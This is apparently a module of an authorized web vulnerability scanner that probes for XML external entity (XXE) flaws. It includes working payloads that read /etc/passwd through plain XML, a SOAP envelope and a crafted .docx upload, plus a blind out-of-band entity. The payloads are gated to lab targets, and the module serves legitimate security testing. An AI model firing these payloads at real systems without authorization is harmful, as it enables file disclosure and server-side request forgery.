// Dark Matter rule-based scanner — XXE probe (v2).
// Sends an entity-expansion probe as application/xml; the oracle is the
// entity resolving in the response. The blind/OOB variant (6 Nov 2026)
// sends an external parameter entity at a collaborator canary URL — a
// callback hit CONFIRMS blind XXE in-scan (class xxe_oob, high); no hit
// means no finding (100% truth rule). The OOB variant is lab-gated
// (opts.labTargets) exactly like the SAML-XXE OOB variant in saml.js.
// Leg (c) (14 Nov 2026, row #301) is the classic SYSTEM-entity file
// disclosure: <!ENTITY dmxxefile SYSTEM "file:///etc/passwd">, confirmed
// ONLY on the passwd root line, absent from the benign control,
// repeat-stable — lab-gated like the OOB leg. Leg (d) (row #304) is the
// same SYSTEM file entity inside a SOAP 1.1 envelope (text/xml +
// SOAPAction), same oracle, lab-gated. Leg (e) (row #304) is a crafted
// .docx whose word/document.xml carries the SYSTEM file entity, uploaded
// to the upload forms the target page exposes (same form discovery as
// fileUpload.js) — confirmed ONLY on the passwd root line in the upload
// response or a fetch-back of the disclosed file URL, absent from the
// benign control .docx, repeat-stable. Leg (e) is gated twice:
// opts.allowWrite (it WRITES a file to the target, the file-upload gate)
// AND isLabTargetHost re-checked before any upload. None of the file
// legs confirms on mere reflection of the entity declaration.
import { isLabTargetHost } from '../../labCreds.js';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';
// The passwd root line, quoted in evidence only as the matched
// fragment — a well-known system-account line, never a secret.
const PASSWD_ROOT_RE = /root:[^:\r\n]*:0:0:[^\r\n]{0,40}/;

function rand() {
  return Math.random().toString(36).slice(2, 10);
}

// ---- pure helpers (exported for unit tests) ---------------------------------

/** CRC-32 (IEEE 802.3, polynomial 0xEDB88320). Pure. */
const CRC_TABLE = (() => {
  const table = new Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
    table[n] = c >>> 0;
  }
  return table;
})();

export function crc32(buf) {
  let c = 0xFFFFFFFF;
  for (const b of buf) c = CRC_TABLE[(c ^ b) & 0xFF] ^ (c >>> 8);
  return (c ^ 0xFFFFFFFF) >>> 0;
}

/**
 * Minimal stored (uncompressed) ZIP writer — deterministic (fixed DOS
 * date, no extra fields), so the same input gives byte-identical output.
 * Pure. entries: [{ name, data: Buffer|string }].
 */
export function buildZip(entries) {
  const parts = [];
  const central = [];
  let offset = 0;
  const dosTime = 0;
  const dosDate = ((2026 - 1980) << 9) | (1 << 5) | 1; // 2026-01-01 (16-bit DOS date)
  for (const { name, data } of entries) {
    const bytes = Buffer.isBuffer(data) ? data : Buffer.from(String(data), 'utf8');
    const nameBuf = Buffer.from(name, 'utf8');
    const crc = crc32(bytes);
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0);
    lh.writeUInt16LE(20, 4);
    lh.writeUInt16LE(0x0800, 6); // UTF-8 filenames
    lh.writeUInt16LE(0, 8); // stored (no compression)
    lh.writeUInt16LE(dosTime, 10);
    lh.writeUInt16LE(dosDate, 12);
    lh.writeUInt32LE(crc, 14);
    lh.writeUInt32LE(bytes.length, 18);
    lh.writeUInt32LE(bytes.length, 22);
    lh.writeUInt16LE(nameBuf.length, 26);
    lh.writeUInt16LE(0, 28);
    parts.push(lh, nameBuf, bytes);
    const cd = Buffer.alloc(46);
    cd.writeUInt32LE(0x02014b50, 0);
    cd.writeUInt16LE(20, 4); // version made by
    cd.writeUInt16LE(20, 6); // version needed
    cd.writeUInt16LE(0x0800, 8);
    cd.writeUInt16LE(0, 10);
    cd.writeUInt16LE(dosTime, 12);
    cd.writeUInt16LE(dosDate, 14);
    cd.writeUInt32LE(crc, 16);
    cd.writeUInt32LE(bytes.length, 20);
    cd.writeUInt32LE(bytes.length, 24);
    cd.writeUInt16LE(nameBuf.length, 28);
    cd.writeUInt16LE(0, 30); // extra
    cd.writeUInt16LE(0, 32); // comment
    cd.writeUInt16LE(0, 34); // disk
    cd.writeUInt16LE(0, 36); // internal attrs
    cd.writeUInt32LE(0, 38); // external attrs
    cd.writeUInt32LE(offset, 42); // local header offset
    central.push(cd, nameBuf);
    offset += lh.length + nameBuf.length + bytes.length;
  }
  const cdStart = offset;
  const cdSize = central.reduce((n, b) => n + b.length, 0);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(0, 4);
  end.writeUInt16LE(0, 6);
  end.writeUInt16LE(entries.length, 8);
  end.writeUInt16LE(entries.length, 10);
  end.writeUInt32LE(cdSize, 12);
  end.writeUInt32LE(cdStart, 16);
  end.writeUInt16LE(0, 20);
  return Buffer.concat([...parts, ...central, end]);
}

const OOXML_CONTENT_TYPES = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>`;
const OOXML_RELS = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>`;

/** word/document.xml carrying a SYSTEM file entity (the #304 OOXML payload). Pure. */
export function ooxmlDocumentXmlMalicious() {
  return `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE w:document [<!ENTITY dmxxefile SYSTEM "file:///etc/passwd">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&dmxxefile;</w:t></w:r></w:p></w:body></w:document>`;
}

/** word/document.xml for the benign control (same shape, no DOCTYPE/entities). Pure. */
export function ooxmlDocumentXmlControl() {
  return `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>dm-control</w:t></w:r></w:p></w:body></w:document>`;
}

/** Minimal .docx (stored ZIP) carrying the given word/document.xml. Pure. */
export function buildDocx(documentXml) {
  return buildZip([
    { name: '[Content_Types].xml', data: OOXML_CONTENT_TYPES },
    { name: '_rels/.rels', data: OOXML_RELS },
    { name: 'word/document.xml', data: documentXml },
  ]);
}

/**
 * Judge a file-content leg: the passwd root line must match in the
 * probe response, not match in the control, and match again in the
 * repeat. Returns the matched fragment for evidence, or null. Pure.
 * (Same discipline as xxeXinclude.js assessXincludeFile.)
 */
export function assessXxeFile({ control, probe, repeat }) {
  if (!control || !probe || !repeat) {
    return { verdict: 'unconfirmed', reason: 'incomplete leg — a request failed', match: null };
  }
  if (PASSWD_ROOT_RE.test(control)) {
    return { verdict: 'rejected', reason: 'passwd root line already present in the control response', match: null };
  }
  const m = probe.match(PASSWD_ROOT_RE);
  if (!m) {
    return { verdict: 'rejected', reason: 'passwd root line absent — file not included', match: null };
  }
  if (!PASSWD_ROOT_RE.test(repeat)) {
    return { verdict: 'unconfirmed', reason: 'root line did not reproduce on repeat', match: null };
  }
  return { verdict: 'confirmed', reason: 'passwd root line included, absent from control, repeat-stable', match: m[0] };
}

/**
 * Find <input type="file"> forms in a page (same pattern as
 * fileUpload.js, max 2 forms). Pure.
 */
export function findUploadForms(body, base) {
  const forms = [];
  const re = /<form[^>]*>([\s\S]*?)<\/form>/gi;
  let m;
  while ((m = re.exec(String(body || '')))) {
    const tag = m[0].slice(0, 500);
    if (!/type=["']?file/i.test(m[0])) continue;
    const action = (/action=["']([^"']*)["']/i.exec(tag) || [])[1] || base;
    const fileInput = (/name=["']([^"']+)["'][^>]*type=["']?file/i.exec(m[0]) ||
      /type=["']?file[^>]*name=["']([^"']+)["']/i.exec(m[0]) || [])[1] || 'file';
    try {
      forms.push({ action: new URL(action, base).toString(), fileInput });
    } catch {
      // ignore
    }
  }
  return forms.slice(0, 2);
}

function escapeRegExp(s) {
  return s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

/**
 * Find a retrievable URL for an uploaded file in the upload response
 * (same pattern as fileUpload.js). Pure.
 */
export function findUploadedUrl(respText, filename, base) {
  const esc = escapeRegExp(filename);
  const attr = new RegExp(`(?:href|src|action)\\s*=\\s*["']([^"']*${esc}[^"']*)["']`, 'i').exec(respText);
  if (attr) {
    try { return new URL(attr[1], base).toString(); } catch { return null; }
  }
  const bare = new RegExp(`["'\\s]\\s*(/[^"'\\s]*${esc}[^"'\\s]*)`, 'i').exec(respText);
  if (bare) {
    try { return new URL(bare[1], base).toString(); } catch { return null; }
  }
  return null;
}

// LAB GATE: the OOB variant runs only when the authorized host is listed
// in opts.labTargets (canonical isLabTargetHost, labCreds.js).

export async function probeXxe(url, opts = {}) {
  const findings = [];
  const timeoutMs = opts.timeoutMs || 15000;

  // POST application/xml, returning {status, text}. A transport failure
  // yields status 0 and empty text — the caller decides what that means.
  async function postXml(body, extraHeaders = {}) {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), timeoutMs);
    try {
      const res = await fetch(url, {
        method: 'POST',
        signal: ctrl.signal,
        headers: { 'User-Agent': UA, 'Content-Type': 'application/xml', ...(opts.headers || {}), ...extraHeaders },
        body,
      });
      const text = await res.text().catch(() => '');
      return { status: res.status, text };
    } catch {
      return { status: 0, text: '' };
    } finally {
      clearTimeout(t);
    }
  }

  // GET a page as text (the OOXML leg's form discovery + fetch-back).
  async function getText(target) {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), timeoutMs);
    try {
      const res = await fetch(target, {
        signal: ctrl.signal,
        headers: { 'User-Agent': UA, ...(opts.headers || {}) },
      });
      return await res.text().catch(() => '');
    } catch {
      return '';
    } finally {
      clearTimeout(t);
    }
  }

  // Multipart upload of a .docx to an upload form (the OOXML leg).
  async function uploadDocx(form, filename, docxBytes) {
    const fd = new FormData();
    fd.append(form.fileInput, new Blob([docxBytes], { type: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' }), filename);
    fd.append('Submit', 'Upload');
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 20000);
    try {
      const res = await fetch(form.action, {
        method: 'POST',
        signal: ctrl.signal,
        headers: { 'User-Agent': UA, ...(opts.headers || {}) },
        body: fd,
      });
      return { status: res.status, text: await res.text().catch(() => '') };
    } catch {
      return { status: 0, text: '' };
    } finally {
      clearTimeout(t);
    }
  }

  // (a) Internal entity expansion (v1, unchanged): a benign DOCTYPE
  // defines <!ENTITY dmxxe "DMXXE123"> and references it in the body.
  // If the response reflects the EXPANDED value, the parser processes
  // entities → XXE-capable parser.
  const internalPayload = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY dmxxe "DMXXE123">]><r>&dmxxe;</r>`;
  const first = await postXml(internalPayload);
  if (first.text.includes('DMXXE123')) {
    const idx = first.text.indexOf('DMXXE123');
    const window = first.text.slice(Math.max(0, idx - 60), idx + 80);
    findings.push({
      class: 'xxe',
      id: 'xxe-entity-expansion',
      title: 'XML external entity (XXE) — entity expansion',
      severity: 'high',
      url,
      evidence: {
        request: 'POST application/xml with <!ENTITY dmxxe "DMXXE123">',
        response: `entity expanded in the response — "...${window}..."`,
        impact_demo: 'the XML parser resolves attacker-defined entities',
        signalCorrelated: true,
      },
    });
  }

  // (b) OOB external-entity variant: only when an OOB callback base is
  // available (opts.oobCallback) AND the host is lab-gated. Never targets
  // real files — the entity target is a canary URL only. When a waiter is
  // wired (opts.oobWaitFor — runScan starts the in-process collaborator
  // for lab-gated scans), a callback hit for our token CONFIRMS blind XXE
  // in-scan: the hit record carries oobHit:true so the differential
  // verifier judges it under the SSRF/OOB protocol (differential.js
  // endsWith('oob') guard). No hit → no finding (100% truth rule:
  // unconfirmed stays silent). Without a waiter (an external oobCallback
  // string only) the old honest INFO record stands — dispatched,
  // confirmation out-of-band. Same shape as saml.js saml_xxe_oob.
  // The first POST must have reached the target: a transport failure
  // there means the endpoint is down, and waiting up to 8s for a hit
  // that cannot come would only stall the scan (saml.js has the same
  // precondition implicitly — it only runs after an ACS was found).
  if (first.status !== 0 && opts.oobCallback && isLabTargetHost(url, opts.labTargets)) {
    const token = `xxe-oob-${rand()}`;
    const oobUrl = `${String(opts.oobCallback).replace(/\/+$/, '')}/${token}`;
    const oobPayload = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % dmxxe SYSTEM "${oobUrl}"> %dmxxe;]><r>oob-probe</r>`;
    const rOob = await postXml(oobPayload);
    if (typeof opts.oobWaitFor === 'function') {
      const hit = await opts.oobWaitFor(token, opts.oobWaitTimeoutMs || 8000);
      if (hit) {
        findings.push({
          class: 'xxe_oob',
          id: `xxe-oob-${rand()}`,
          title: 'XML external entity (XXE) blind out-of-band — parser fetched the collaborator URL',
          severity: 'high',
          url,
          evidence: {
            request: `POST application/xml with <!ENTITY % dmxxe SYSTEM "${oobUrl}">`,
            response: `external parameter entity → ${oobUrl} sent (status ${rOob.status}); ` +
              `collaborator received ${hit.method} ${hit.path} at ${hit.at} — the parser resolved the external entity`,
            impact_demo: 'Blind XXE: the XML parser fetches attacker-controlled URLs — gateway to SSRF / file disclosure via external entities',
            signalCorrelated: true,
            oobHit: true,
          },
        });
      }
    } else {
      findings.push({
        class: 'xxe_oob_sent',
        id: `xxe-oob-${rand()}`,
        title: 'XXE OOB probe dispatched (external parameter entity) — confirm via collaborator',
        severity: 'info',
        url,
        evidence: {
          request: `POST application/xml with <!ENTITY % dmxxe SYSTEM "${oobUrl}">`,
          response: `external parameter entity → ${oobUrl} sent (status ${rOob.status}; canary URL only, no file targets); ` +
            `confirm out-of-band via the collaborator`,
          impact_demo: 'An OOB hit proves external-entity resolution (blind XXE)',
          signalCorrelated: true,
        },
      });
    }
  }

  // (c) Classic SYSTEM-entity file disclosure (row #301): the external
  // entity reads /etc/passwd through the target's own parser. Confirm
  // ONLY on the passwd root line in the response, absent from the benign
  // control document, repeat-stable (same differential discipline as
  // leg (a) and xxeXinclude Leg F). Mere reflection of the entity
  // declaration never confirms — the declaration string contains no
  // root line. Lab-gated like the OOB leg: a file read leaves the lab
  // only on an authorized lab host.
  if (isLabTargetHost(url, opts.labTargets)) {
    const filePayload = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY dmxxefile SYSTEM "file:///etc/passwd">]><r>&dmxxefile;</r>`;
    const control = await postXml(`<r>dm-control</r>`);
    if (control.status !== 0) {
      const probe = await postXml(filePayload);
      if (probe.status !== 0) {
        const repeat = await postXml(filePayload);
        const judged = assessXxeFile({ control: control.text, probe: probe.text, repeat: repeat.text });
        if (judged.verdict === 'confirmed') {
          findings.push({
            class: 'xxe_file',
            id: 'xxe-file-disclosure',
            title: 'XML external entity (XXE) — classic file disclosure via SYSTEM entity',
            severity: 'high',
            url,
            evidence: {
              request: 'POST application/xml with <!ENTITY dmxxefile SYSTEM "file:///etc/passwd">',
              response: `passwd root line reflected in the response ("${judged.match}"), absent from the benign control, repeat-stable — the parser resolved the external file entity`,
              impact_demo: 'Classic XXE file disclosure: the XML parser reads local files — /etc/passwd content returned to the attacker',
              signalCorrelated: true,
            },
          });
        }
      }
    }
  }

  // (d) SOAP-envelope file disclosure (row #304): the same SYSTEM file
  // entity inside a SOAP 1.1 envelope — a SOAP service that parses the
  // envelope with an XXE-capable parser resolves it. Confirm ONLY on
  // the passwd root line, absent from the benign control envelope,
  // repeat-stable. Lab-gated like leg (c). The SOAPAction header marks
  // the body as a SOAP call (text/xml, SOAP 1.1).
  if (isLabTargetHost(url, opts.labTargets)) {
    const soapPayload = `<?xml version="1.0"?><!DOCTYPE soap:Envelope [<!ENTITY dmxxefile SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><r>&dmxxefile;</r></soap:Body></soap:Envelope>`;
    const soapControl = `<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><r>dm-control</r></soap:Body></soap:Envelope>`;
    const soapHeaders = { 'Content-Type': 'text/xml; charset=utf-8', SOAPAction: '"urn:dmxxe#Probe"' };
    const control = await postXml(soapControl, soapHeaders);
    if (control.status !== 0) {
      const probe = await postXml(soapPayload, soapHeaders);
      if (probe.status !== 0) {
        const repeat = await postXml(soapPayload, soapHeaders);
        const judged = assessXxeFile({ control: control.text, probe: probe.text, repeat: repeat.text });
        if (judged.verdict === 'confirmed') {
          findings.push({
            class: 'xxe_soap',
            id: 'xxe-soap-file',
            title: 'XML external entity (XXE) in SOAP envelope — local file disclosure',
            severity: 'high',
            url,
            evidence: {
              request: 'POST text/xml (SOAPAction urn:dmxxe#Probe) with <!ENTITY dmxxefile SYSTEM "file:///etc/passwd"> inside a SOAP envelope',
              response: `passwd root line reflected in the response ("${judged.match}"), absent from the benign control envelope, repeat-stable — the SOAP parser resolved the external file entity`,
              impact_demo: 'XXE inside a SOAP envelope: the SOAP parser reads local files — /etc/passwd content returned to the attacker',
              signalCorrelated: true,
            },
          });
        }
      }
    }
  }

  // (e) OOXML file disclosure (row #304): a crafted .docx whose
  // word/document.xml carries the SYSTEM file entity, uploaded to the
  // upload forms the target page exposes. Confirm ONLY on the passwd
  // root line — in the upload response, or in a fetch-back of the
  // disclosed file URL — absent from the benign control .docx upload,
  // repeat-stable. The evidence quotes only the matched root-line
  // fragment, never a file dump. Lab-gated twice: opts.allowWrite (it
  // WRITES a file to the target, the file-upload gate) AND
  // isLabTargetHost re-checked before any upload.
  if (opts.allowWrite === true && isLabTargetHost(url, opts.labTargets)) {
    const page = await getText(url);
    const forms = findUploadForms(page, url);
    for (const form of forms) {
      const randSuffix = rand();
      const ctrlName = `dmprobe_${randSuffix}.docx`;
      const evilName = `dmprobe_${randSuffix}-xxe.docx`;
      // Gather the evidence text for one .docx upload: the upload
      // response plus, when it discloses where the file went, a
      // fetch-back of that URL. Empty string when the upload fails.
      const gather = async (filename, docxBytes) => {
        const r = await uploadDocx(form, filename, docxBytes);
        if (r.status === 0) return '';
        let text = r.text;
        const upUrl = findUploadedUrl(r.text, filename, form.action);
        if (upUrl) {
          const back = await getText(upUrl);
          if (back) text += `\n${back}`;
        }
        return text;
      };
      const controlText = await gather(ctrlName, buildDocx(ooxmlDocumentXmlControl()));
      if (!controlText) continue;
      const probeText = await gather(evilName, buildDocx(ooxmlDocumentXmlMalicious()));
      if (!probeText) continue;
      const repeatText = await gather(evilName, buildDocx(ooxmlDocumentXmlMalicious()));
      if (!repeatText) continue;
      const judged = assessXxeFile({ control: controlText, probe: probeText, repeat: repeatText });
      if (judged.verdict === 'confirmed') {
        findings.push({
          class: 'xxe_ooxml',
          id: 'xxe-ooxml-file',
          title: 'XML external entity (XXE) in Office document (OOXML) — local file disclosure',
          severity: 'high',
          url: form.action,
          evidence: {
            request: `POST ${form.action} multipart (${form.fileInput}=${evilName}, crafted .docx with <!ENTITY dmxxefile SYSTEM "file:///etc/passwd"> in word/document.xml)`,
            response: `passwd root line reflected ("${judged.match}"), absent from the benign control .docx upload, repeat-stable — the document parser resolved the external file entity`,
            impact_demo: 'XXE inside an Office document: the document parser reads local files — /etc/passwd content returned to the attacker',
            signalCorrelated: true,
          },
        });
      }
    }
  }

  return findings;
}
